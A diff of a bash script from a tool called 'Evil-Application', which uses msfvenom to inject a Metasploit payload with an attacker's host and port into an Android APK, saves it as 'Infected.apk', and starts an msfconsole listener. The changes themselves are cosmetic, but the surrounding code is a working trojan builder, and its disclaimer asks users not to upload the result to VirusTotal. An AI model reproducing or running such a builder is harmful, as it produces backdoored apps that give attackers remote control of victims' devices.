@@ -163,8 +163,8 @@ printf "${BR}Please! Do not use this Tool for illegal purposes!\n"
 printf "Any illegal purpose of this Tool is your responsibility\n"
 printf "Test it on your own devices and network! H4cking is Illegal\n"
 printf "Please Do not upload the application on the virus total!\n"
-sleep 2
 printf "${BG}\n"
+sleep 2
 read -n 1 -s -r -p "Press any key to continue"
 sleep 0.5
 printf "${BG}\nOK.\n"
@@ -225,7 +225,7 @@ printf "${BG}payload-type=${BR}$load \n"
 printf "${BG}Host & Port=${BR}$ip:$port\n"
 printf "${BYel}Warning...\n"
 printf "${BYel}About to embed $apk with $ip:$port \n"
-xterm -T "Infecting $apk" -hold -geometry 95x28+1000+1000 -e "sudo msfvenom -x original.apk/$apk -p $load lhost=$ip lport=$port -o infected.apk/Infected.apk"
+xterm -T "Infecting $apk" -geometry 95x28+1000+1000 -e "sudo msfvenom -x original.apk/$apk -p $load lhost=$ip lport=$port -o infected.apk/Infected.apk; sleep 10"
 if [[ -e infected.apk/Infected.apk ]]; then
 cowsay "App Successful"
 echo "app-name=$apk" > infected.apk/lastexecute.txt
@@ -273,6 +273,7 @@ msfconsole --resource autometasploit.rc
 elif [[ $opt == 2 || $opt == 02 ]]; then
 ./evil
 elif [[ $opt == 3 || $opt == 02 ]]; then
+clear
 banner/evil2.sh
 echo
 printf "${BG}Thank-You for using Evil-Application!\nBye :)\n"
